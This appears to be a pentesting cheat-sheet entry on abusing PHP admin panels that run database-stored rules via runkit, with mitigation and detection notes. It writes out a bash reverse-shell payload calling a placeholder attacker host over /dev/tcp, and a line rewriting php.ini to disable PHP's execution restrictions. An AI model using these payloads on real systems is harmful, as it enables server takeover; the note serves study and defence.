---
topic: PHP — user rules executed with runkit
tags: [web, php, runkit, code-injection, sandbox-escape]
---

# PHP — user rules executed with runkit

[🇪🇸 Español](php-runkit-rule-injection.md) | **English**

## Concept

`runkit_function_add` and `runkit_function_redefine` create or replace PHP functions at runtime. An application that stores rules in the database and loads them with runkit turns the admin panel into code execution. If the validator also runs with a `php.ini` the user can write, the sandbox disappears.

## When it applies

- The panel edits rules, templates or PHP snippets.
- The application loads them with `runkit_function_add`, `eval` or `create_function`.
- The validator uses a writable configuration file.

## Procedure

1. Confirm the rule is evaluated on save or on an action.
2. Inject a call to `system` or `shell_exec`.
3. If blocked, write a `php.ini` that clears `disable_functions`.
4. Run the rule and obtain a shell.

```php
system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'); return true;
```

```php
file_put_contents('/path/php.ini', "engine=On\nopen_basedir=\ndisable_functions=\n");
```

## Variants

- `assert` with a controlled string.
- `preg_replace` with the `/e` modifier in old PHP.
- Twig or Smarty rules exposing dangerous functions.

## Limitations

- `runkit` is unavailable on PHP 8 without the extension.
- `disable_functions` and `open_basedir` restrict execution.
- The configuration file must be writable by the service user.

## Mitigation

- Do not execute PHP code from the database.
- Use declarative rules and validators in an unprivileged container.
- Mount `php.ini` read-only and separate the validator from the runtime.

## Detection

- Rule changes followed by child processes of the web server.
- Writes to `php.ini` or configuration paths.
- `runkit_function_add` in production.

## References

- [PHP — runkit_function_add](https://www.php.net/manual/en/function.runkit-function-add.php)
- [0xdf — Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [CWE-94 — Code Injection](https://cwe.mitre.org/data/definitions/94.html)
